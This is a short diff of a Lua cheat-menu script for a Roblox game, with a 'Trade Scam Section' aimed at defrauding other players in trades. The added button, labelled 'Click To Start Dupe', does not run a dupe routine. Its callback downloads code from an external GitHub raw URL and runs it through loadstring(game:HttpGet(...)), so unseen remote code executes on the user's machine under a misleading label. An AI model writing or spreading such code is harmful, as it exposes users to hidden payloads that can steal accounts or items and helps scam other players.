@@ -56,13 +56,12 @@ if game.PlaceId == 6284583030 then
 	Name = "Trade Scam Section"
 })
 
-    Tab:AddToggle({
-        Name = "Trade Scam",
-        Default = false,
-        Callback = function(Value)
-            print(Value)
-        end    
-    })
+    Tab:AddButton({
+        Name = "Click To Start Dupe",
+        Callback = function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Maset0/PSX/main/info.lua"))()
+          end 
+ })
 
     Tab:AddButton({
 	Name = "Remove Trade Pet",
